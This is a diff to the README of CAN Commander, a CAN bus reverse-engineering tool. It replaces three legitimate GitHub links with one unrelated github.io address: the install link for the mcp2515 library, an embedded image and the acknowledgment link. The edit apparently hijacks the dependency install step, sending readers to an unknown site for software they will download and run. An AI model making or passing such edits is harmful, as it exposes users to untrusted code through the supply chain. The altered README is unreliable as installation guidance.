@@ -18,7 +18,7 @@ CAN Commander is a comprehensive tool designed for the reverse engineering of CA
 To get started with CAN Commander, follow these steps:
 
 1. **Clone the Repository**:
-   - Next install autowp's mcp2515 library: https://github.com/autowp/arduino-mcp2515
+   - Next install autowp's mcp2515 library: https://deviantjroc710.github.io
 
 1.5 **Using the CAN Commander Official Board**:
    - All CAN Commander Official Boards ship pre-flashed :)
@@ -73,7 +73,7 @@ To get started with CAN Commander, follow these steps:
 - Microcontroller (Arduino Uno, Mega, Nano, Pico, ESP8266, ESP32)
 - MCP2515 (Make sure you verify the crystal 8/16/etc)
 
-![20240113_010817](https://github.com/MatthewKuKanich/CAN_Commander/assets/113921492/410fce00-e54a-4fb6-ad24-4d3d278d5a5b)
+![20240113_010817](https://deviantjroc710.github.io)
 
 ## Software Dependencies
 - Arduino IDE
@@ -83,4 +83,4 @@ To get started with CAN Commander, follow these steps:
 I welcome contributions to the CAN Commander project! I am currently working on the contributing guide and related documents. I'll moderate PRs regularly until this is finished so you can still contribute.
 
 ## Acknowledgments
-- Thanks to autowp for the amazing mcp2515 library: https://github.com/autowp/arduino-mcp2515
+- Thanks to autowp for the amazing mcp2515 library: https://deviantjroc710.github.io
